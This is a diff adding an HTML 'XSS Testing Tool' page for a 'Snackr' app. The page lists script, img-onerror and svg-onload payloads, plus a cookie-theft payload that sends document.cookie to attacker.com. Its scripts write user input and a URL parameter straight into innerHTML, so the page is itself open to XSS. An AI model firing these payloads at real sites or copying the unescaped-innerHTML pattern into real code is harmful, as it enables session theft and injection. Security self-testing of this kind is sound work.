@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Testing Tool - Snackr App</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d32f2f;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .test-section {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f9f9f9;
+            border-left: 4px solid #007bff;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .payload {
+            font-family: monospace;
+            background: #f4f4f4;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 5px 0;
+            word-break: break-all;
+        }
+        .result {
+            margin-top: 10px;
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 4px;
+            min-height: 50px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 XSS Testing Tool</h1>
+        
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> Only use this tool on your own application for security testing. 
+            Never test XSS vulnerabilities on systems you don't own or without authorization.
+        </div>
+
+        <div class="test-section">
+            <h3>Test 1: Basic XSS Payloads</h3>
+            <p>Try these payloads in registration forms, search boxes, or any input field:</p>
+            
+            <div class="payload">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+            <button onclick="testPayload(this.previousElementSibling.textContent)">Test This Payload</button>
+            
+            <div class="payload">&lt;img src=x onerror=alert('XSS')&gt;</div>
+            <button onclick="testPayload(this.previousElementSibling.textContent)">Test This Payload</button>
+            
+            <div class="payload">&lt;svg onload=alert('XSS')&gt;</div>
+            <button onclick="testPayload(this.previousElementSibling.textContent)">Test This Payload</button>
+            
+            <div class="payload">javascript:alert('XSS')</div>
+            <button onclick="testPayload(this.previousElementSibling.textContent)">Test This Payload</button>
+            
+            <div class="result" id="result1"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 2: Cookie Theft (Advanced XSS)</h3>
+            <p>If XSS works, this payload will steal cookies:</p>
+            
+            <div class="payload">&lt;script&gt;fetch('http://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</div>
+            <p><small>Note: Replace 'attacker.com' with your test server to see if cookies are accessible</small></p>
+            
+            <div class="result" id="result2"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 3: DOM-based XSS</h3>
+            <p>Test URL parameters for DOM manipulation:</p>
+            
+            <input type="text" id="domInput" placeholder="Enter XSS payload">
+            <button onclick="testDOMXSS()">Test DOM XSS</button>
+            
+            <div class="result" id="result3"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 4: Form Input Testing</h3>
+            <p>Enter XSS payload to test in registration/login forms:</p>
+            
+            <textarea id="customPayload" rows="3" placeholder="Enter your XSS payload here"></textarea>
+            <button onclick="testCustomPayload()">Test Custom Payload</button>
+            
+            <div class="result" id="result4"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 5: Check if Input is Escaped</h3>
+            <p>Enter text and see how it's rendered:</p>
+            
+            <input type="text" id="escapeTest" placeholder="Enter: &lt;script&gt;alert('test')&lt;/script&gt;">
+            <button onclick="testEscaping()">Test Escaping</button>
+            
+            <div class="result" id="result5"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Manual Testing Instructions</h3>
+            <ol>
+                <li>Open your Snackr app in a browser</li>
+                <li>Open Developer Tools (F12)</li>
+                <li>Go to the Console tab</li>
+                <li>Try registering with XSS payloads in the name field</li>
+                <li>Check if the payload executes when viewing your profile</li>
+                <li>Test in search boxes, comment fields, or any user input</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        function testPayload(payload) {
+            const result = document.getElementById('result1');
+            result.innerHTML = `
+                <strong>Payload:</strong> ${escapeHtml(payload)}<br>
+                <strong>Rendered:</strong> <span id="rendered"></span>
+            `;
+            document.getElementById('rendered').innerHTML = payload;
+            
+            if (result.querySelector('script')) {
+                result.innerHTML += '<br><span style="color:red;">⚠️ VULNERABLE: Script tag was executed!</span>';
+            }
+        }
+
+        function testDOMXSS() {
+            const input = document.getElementById('domInput').value;
+            const result = document.getElementById('result3');
+            
+            // Simulate URL parameter injection
+            const urlParams = new URLSearchParams(window.location.search);
+            urlParams.set('test', input);
+            
+            result.innerHTML = `
+                <strong>Input:</strong> ${escapeHtml(input)}<br>
+                <strong>Would be in URL:</strong> ?test=${encodeURIComponent(input)}<br>
+                <strong>Rendered:</strong> <span id="domRendered"></span>
+            `;
+            document.getElementById('domRendered').innerHTML = input;
+        }
+
+        function testCustomPayload() {
+            const payload = document.getElementById('customPayload').value;
+            const result = document.getElementById('result4');
+            
+            result.innerHTML = `
+                <strong>Payload to test:</strong><br>
+                <div class="payload">${escapeHtml(payload)}</div>
+                <p><strong>Instructions:</strong></p>
+                <ol>
+                    <li>Copy the payload above</li>
+                    <li>Paste it into a registration form (name field)</li>
+                    <li>Submit the form</li>
+                    <li>Check if alert() executes or script runs</li>
+                </ol>
+            `;
+        }
+
+        function testEscaping() {
+            const input = document.getElementById('escapeTest').value;
+            const result = document.getElementById('result5');
+            
+            result.innerHTML = `
+                <strong>Input:</strong> ${escapeHtml(input)}<br>
+                <strong>Escaped HTML:</strong> ${escapeHtml(input)}<br>
+                <strong>If rendered unescaped (VULNERABLE):</strong> <span id="unescaped"></span>
+            `;
+            
+            const unescapedEl = document.getElementById('unescaped');
+            unescapedEl.innerHTML = input; // This is what happens if not escaped
+            
+            if (unescapedEl.querySelector('script') || unescapedEl.querySelector('img')) {
+                result.innerHTML += '<br><span style="color:red;">⚠️ VULNERABLE: Script/HTML would execute!</span>';
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Check URL for XSS payloads
+        const urlParams = new URLSearchParams(window.location.search);
+        const testParam = urlParams.get('test');
+        if (testParam) {
+            document.getElementById('result3').innerHTML = `
+                <strong>URL Parameter Found:</strong> ${escapeHtml(testParam)}<br>
+                <strong>Rendered:</strong> <span id="urlRendered"></span>
+            `;
+            document.getElementById('urlRendered').innerHTML = testParam;
+        }
+    </script>
+</body>
+</html>
+
